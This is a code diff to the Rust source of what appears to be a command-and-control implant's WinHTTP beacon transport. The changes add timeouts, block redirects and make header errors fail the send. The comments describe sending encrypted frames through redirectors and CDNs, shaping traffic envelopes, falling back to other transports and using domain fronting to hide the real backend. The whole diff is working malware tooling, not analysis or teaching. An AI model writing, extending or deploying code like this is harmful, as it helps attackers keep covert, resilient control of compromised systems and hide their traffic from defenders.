@@ -34,6 +34,24 @@ const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x0000_0100;
 const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x0000_2000;
 const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;
 
+/// WinHttpSetOption option code: disable request-level features.
+const WINHTTP_OPTION_DISABLE_FEATURE: u32 = 63; // 0x3F
+/// Value OR'd into WINHTTP_OPTION_DISABLE_FEATURE: never follow 3xx redirects.
+/// With redirects enabled (the WinHTTP default), a misconfigured redirector
+/// answering 301/302 gets followed silently — the beacon's POST (and its
+/// encrypted frame) lands on an unintended target and the cycle looks like a
+/// success while the reply is garbage. Disabling redirects turns ANY 3xx into
+/// a hard send/receive failure → the channel reports None and the fallback
+/// chain takes over, which is the honest signal that the endpoint isn't a
+/// working beacon URI.
+const WINHTTP_DISABLE_REDIRECTS: u32 = 0x0002;
+
+/// Per-session WinHTTP timeouts (resolve/connect/send/receive), milliseconds.
+/// 10 s bounds how long a dead/black-holed redirector can stall the beacon
+/// cycle; the WinHTTP defaults (60 s resolve, 30 s I/O) would otherwise freeze
+/// the implant for minutes on a silently-dropping endpoint.
+const WINHTTP_TIMEOUT_MS: i32 = 10_000;
+
 /// Maximum total response body size in bytes. A malicious server (or MitM)
 /// could send an unlimited response body to exhaust the implant's bump
 /// allocator (which has limited virtual memory). 16 MiB is generous enough
@@ -68,10 +86,16 @@ struct WinhttpFns {
     /// client block declares static headers or a header-terminator (data rides
     /// in a header instead of the body). None ⇒ headers silently skipped.
     add_request_headers: Option<FAddReqHeaders>,
+    /// Optional: WinHttpSetTimeouts — per-session resolve/connect/send/receive
+    /// bounds (10 s). Present in every WinHTTP ≥ 5.1; None ⇒ WinHTTP defaults
+    /// (60 s resolve / 30 s I/O) apply instead.
+    set_timeouts: Option<FSetTimeouts>,
 }
 
 type HINTERNET = *mut c_void;
 type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
+/// BOOL WinHttpSetTimeouts(HINTERNET, int resolve, int connect, int send, int receive)
+type FSetTimeouts = unsafe extern "system" fn(HINTERNET, i32, i32, i32, i32) -> i32;
 type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
 type FOpenReq = unsafe extern "system" fn(
     HINTERNET,
@@ -141,6 +165,8 @@ pub unsafe fn ensure_winhttp() {
     let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
     // Optional: WinHttpAddRequestHeaders (client-block headers / header terminator).
     let arh = export_addr(b"winhttp.dll", b"WinHttpAddRequestHeaders");
+    // Optional: WinHttpSetTimeouts (per-session 10 s bounds).
+    let st = export_addr(b"winhttp.dll", b"WinHttpSetTimeouts");
     if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
         (o, c, r, s, v, d, cl, q)
     {
@@ -159,6 +185,10 @@ pub unsafe fn ensure_winhttp() {
             close_handle: core::mem::transmute(cl),
             query_data: core::mem::transmute(q),
             add_request_headers: match arh {
+                Some(a) => Some(core::mem::transmute(a)),
+                None => None,
+            },
+            set_timeouts: match st {
                 Some(a) => Some(core::mem::transmute(a)),
                 None => None,
             },
@@ -222,6 +252,19 @@ pub unsafe fn post_frame(
     if session.is_null() {
         return None;
     }
+    // Per-session 10 s timeouts (resolve/connect/send/receive). Bounds how
+    // long a black-holed endpoint can stall the beacon cycle (WinHTTP defaults
+    // are 60 s resolve / 30 s I/O). A failure to set is non-fatal — the
+    // session still works with WinHTTP defaults.
+    if let Some(set_timeouts) = fns.set_timeouts {
+        let _ = set_timeouts(
+            session,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+        );
+    }
     let host16 = to_utf16(host);
     let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
     if conn.is_null() {
@@ -246,6 +289,20 @@ pub unsafe fn post_frame(
         (fns.close_handle)(conn);
         (fns.close_handle)(session);
         return None;
+    }
+    // 3xx redirects are NOT a working beacon round-trip: following them (the
+    // WinHTTP default) would deliver the encrypted frame to an unintended
+    // target and mask a dead endpoint as a success. Disabling redirects makes
+    // WinHTTP fail the request on any 3xx → this function returns None → the
+    // fallback chain takes over. Must be set BEFORE the first send.
+    if let Some(set_opt) = fns.set_option {
+        let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
+        let _ = set_opt(
+            req,
+            WINHTTP_OPTION_DISABLE_FEATURE,
+            &disable as *const u32 as *const u8,
+            4,
+        );
     }
     // ---- Envelope shaping (profile-driven, done BEFORE send) ----
     let csteps = crate::envelopes::post_client_steps();
@@ -277,7 +334,19 @@ pub unsafe fn post_frame(
         if !hdr.is_empty() {
             let hdr16 = to_utf16(&hdr);
             let hdr_len = (hdr16.len() - 1) as u32;
-            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
+            // Propagate header-set failure: the profile's static client-block
+            // headers — and in the header-terminator case the ENTIRE frame
+            // (wire_body is empty) — ride in these headers. If
+            // WinHttpAddRequestHeaders fails, sending now would emit a request
+            // missing the envelope (or drop the frame outright), so treat it as
+            // a channel failure and let the fallback chain pick another
+            // transport.
+            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
+                (fns.close_handle)(req);
+                (fns.close_handle)(conn);
+                (fns.close_handle)(session);
+                return None;
+            }
         }
     }
 
@@ -403,10 +472,19 @@ const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;
 /// Optional HTTP enhancements for domain fronting and proxy support.
 ///
 /// When `fronting_host` is non-empty, it overrides the HTTP `Host:` header —
-/// the TCP connection still goes to `connect_host`, but the TLS SNI and HTTP
-/// Host header say `fronting_host`. This is the domain-fronting technique:
-/// connect to a CDN IP, present a legitimate domain's SNI, but the CDN routes
-/// to the real backend via the Host header.
+/// the TCP connection still goes to `connect_host`, but the Host header says
+/// `fronting_host`. This is the CDN-routing half of domain fronting: connect
+/// to a CDN IP, present the CDN's name, and let the CDN route to the real
+/// backend via the Host header.
+///
+/// IMPORTANT — what WinHTTP does NOT do: the TLS SNI stays `connect_host`.
+/// WinHTTP derives the SNI from the host passed to `WinHttpConnect`; there
+/// is no API to override it (the Host header is set independently via
+/// `WinHttpAddRequestHeaders`). So with TLS the handshake presents
+/// `connect_host`'s name — the CDN must accept that name (SNI) AND route on
+/// the Host header. A `fronting_host` that the CDN's TLS layer doesn't serve
+/// will fail the handshake; pick `connect_host` as a hostname the CDN fronts
+/// for, not an arbitrary front domain.
 ///
 /// When `proxy_url` is non-empty (format `"host:port"`), WinHTTP routes the
 /// request through that proxy instead of using the system default. Optional
@@ -478,6 +556,16 @@ pub unsafe fn post_frame_enhanced(
     if session.is_null() {
         return None;
     }
+    // Per-session 10 s timeouts — same rationale as post_frame.
+    if let Some(set_timeouts) = fns.set_timeouts {
+        let _ = set_timeouts(
+            session,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+            WINHTTP_TIMEOUT_MS,
+        );
+    }
 
     // ---- WinHttpConnect to the actual connect_host (CDN IP or redirector) ----
     let host16 = to_utf16(connect_host);
@@ -504,6 +592,17 @@ pub unsafe fn post_frame_enhanced(
         (fns.close_handle)(conn);
         (fns.close_handle)(session);
         return None;
+    }
+    // 3xx redirects → channel failure (same rationale as post_frame). Must be
+    // set BEFORE the first send.
+    if let Some(set_opt) = fns.set_option {
+        let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
+        let _ = set_opt(
+            req,
+            WINHTTP_OPTION_DISABLE_FEATURE,
+            &disable as *const u32 as *const u8,
+            4,
+        );
     }
 
     // ---- Envelope shaping (same as post_frame) ----
@@ -546,7 +645,15 @@ pub unsafe fn post_frame_enhanced(
         if !hdr.is_empty() {
             let hdr16 = to_utf16(&hdr);
             let hdr_len = (hdr16.len() - 1) as u32;
-            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
+            // Propagate header-set failure — same rationale as post_frame: the
+            // fronting Host header (and in the header-terminator case the whole
+            // frame) rides in these headers; a failed add is a channel failure.
+            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
+                (fns.close_handle)(req);
+                (fns.close_handle)(conn);
+                (fns.close_handle)(session);
+                return None;
+            }
         }
     }
 
